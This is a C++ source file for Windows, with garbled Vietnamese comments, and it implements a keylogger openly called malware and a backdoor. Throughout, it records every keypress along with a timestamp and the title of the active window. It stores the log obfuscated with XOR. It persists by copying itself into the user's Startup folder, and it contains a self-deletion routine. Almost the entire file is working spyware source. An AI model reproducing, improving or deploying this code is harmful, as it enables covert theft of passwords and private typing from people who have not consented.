#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <ctime>

using namespace std;

// Hàm l?y th?i gian hi?n t?i
string getCurrentTime() {
    time_t now = time(0);
    tm localTime;
    char buffer[80];

    localtime_s(&localTime, &now);  // S? d?ng localtime_s thay vì localtime
    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", &localTime);

    return string(buffer);
}

// Hàm l?y tên c?a s? hi?n t?i
string getActiveWindowTitle() {
    char windowTitle[256];
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        return string(windowTitle);
    }
    return "Unknown";
}

// Hàm mã hóa XOR
string encryptXOR(const string& input, char key = 'T') {
    string output = input;
    for (char& c : output) {
        c ^= key;
    }
    return output;
}

// Hàm ghi log vào file
void writeToLog(const string& data) {
    ofstream logFile("log.txt", ios::app);
    if (logFile.is_open()) {
        //logFile << data << endl;
        logFile << encryptXOR(data) << endl;
        logFile.close();
    }
}

// Tên file cho backdoor
const char* MALWARE_NAME = "Keylogger.exe";
// Hàm t? ??ng kh?i ??ng cùng h? ?i?u hành
void setAutoStart() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH); // L?y ???ng d?n file hi?n t?i

    // L?y ???ng d?n th? m?c Startup an toàn
    char* appdata = nullptr;
    size_t len = 0;
    _dupenv_s(&appdata, &len, "APPDATA");
    if (appdata != nullptr) {
        std::string startup_path = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + MALWARE_NAME;
        CopyFileA(path, startup_path.c_str(), FALSE);
        free(appdata); // Gi?i phóng b? nh? ?ã c?p phát
    }
}

// Hàm xóa b?n thân
void deleteSelf() {
    char filePath[MAX_PATH];
    GetModuleFileNameA(NULL, filePath, MAX_PATH);
    string cmd = "cmd /c del \"" + string(filePath) + "\"";
    system(cmd.c_str());
}

// Ch??ng trình chính
int main() {
    setAutoStart();  // ??t t? ??ng kh?i ??ng

    // Vòng l?p ghi log bàn phím
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                string log = "[" + getCurrentTime() + "] [" + getActiveWindowTitle() + "] ";

                if (key >= 96 && key <= 105) {  // Ch? và s?
                    log += (char)('0' + (key - 96));
                }
                else {
                    if (key >= 65 && key <= 90) {  // Ch? và s?
                        log += (char)('a' + (key - 65));
                    }
                    else {
                        //if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90) || (key >= 96 && key <= 105)) {  // Ch? và s?
                            //log += (char)key;
                        //}
                        //else {  // Ký t? ??c bi?t
                            switch (key) {
                            case VK_SPACE: log += "[SPACE]"; break;
                            case VK_RETURN: log += "[ENTER]"; break;
                            case VK_TAB: log += "[TAB]"; break;
                            case VK_SHIFT: log += "[SHIFT]"; break;
                            case VK_BACK: log += "[BACKSPACE]"; break;
                            default: log += "[UNKNOWN]";
                            }
                        }
                    }
                //}
                writeToLog(log);
                Sleep(50);
            }
        }
        Sleep(10);  // Gi?m t?i CPU
    }

    deleteSelf();  // Xóa b?n thân
    return 0;
}
